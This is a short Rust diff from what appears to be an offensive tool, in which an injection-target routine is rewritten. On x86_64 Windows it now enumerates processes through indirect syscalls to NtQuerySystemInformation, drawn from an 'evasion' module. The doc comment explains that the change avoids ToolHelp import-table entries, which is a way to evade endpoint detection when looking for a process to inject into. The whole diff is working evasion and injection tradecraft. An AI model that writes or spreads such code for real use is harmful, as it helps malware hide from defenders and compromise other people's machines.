@@ -138,7 +138,47 @@ pub unsafe fn find_injection_target() -> Option<u32> {
     None
 }
 
-#[cfg(target_os = "windows")]
+/// Enumerate processes via NtQuerySystemInformation (class 5) — no ToolHelp IAT entries.
+/// x64 offsets: ImageName.Length@0x38, ImageName.Buffer@0x40, UniqueProcessId@0x50.
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+unsafe fn find_pid_by_name(name: &[u8]) -> Option<u32> {
+    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    let Some((ssn, tramp)) = get_ssn(b"NtQuerySystemInformation") else { return None; };
+    let mut needed = 0u32;
+    let mut dummy = [0u8; 8];
+    indirect_syscall(ssn, tramp, 5, dummy.as_mut_ptr() as usize, 8, &mut needed as *mut u32 as usize, 0, 0);
+    let buf_size = (needed as usize + 0x1000) & !0xFFF;
+    let mut buf = vec![0u8; buf_size];
+    let st = indirect_syscall(ssn, tramp, 5, buf.as_mut_ptr() as usize, buf_size, &mut needed as *mut u32 as usize, 0, 0);
+    if st < 0 { return None; }
+    let target: &[u8] = name.iter().take_while(|&&b| b != 0).as_slice();
+    let mut offset = 0usize;
+    loop {
+        let p = buf.as_ptr().add(offset);
+        let next_off = u32::from_le_bytes([*p, *p.add(1), *p.add(2), *p.add(3)]) as usize;
+        let name_len_bytes = u16::from_le_bytes([*p.add(0x38), *p.add(0x39)]) as usize;
+        let name_len_chars = name_len_bytes / 2;
+        let name_buf_addr = usize::from_le_bytes([
+            *p.add(0x40), *p.add(0x41), *p.add(0x42), *p.add(0x43),
+            *p.add(0x44), *p.add(0x45), *p.add(0x46), *p.add(0x47),
+        ]);
+        if name_len_chars > 0 && name_len_chars == target.len() && name_buf_addr != 0 {
+            let wide = core::slice::from_raw_parts(name_buf_addr as *const u16, name_len_chars);
+            if wide.iter().zip(target.iter()).all(|(&w, &a)| (w as u8).to_ascii_lowercase() == a.to_ascii_lowercase()) {
+                let pid = usize::from_le_bytes([
+                    *p.add(0x50), *p.add(0x51), *p.add(0x52), *p.add(0x53),
+                    *p.add(0x54), *p.add(0x55), *p.add(0x56), *p.add(0x57),
+                ]) as u32;
+                return Some(pid);
+            }
+        }
+        if next_off == 0 { break; }
+        offset += next_off;
+    }
+    None
+}
+
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
 unsafe fn find_pid_by_name(name: &[u8]) -> Option<u32> {
     use windows_sys::Win32::System::Diagnostics::ToolHelp::{
         CreateToolhelp32Snapshot, Process32First, Process32Next,
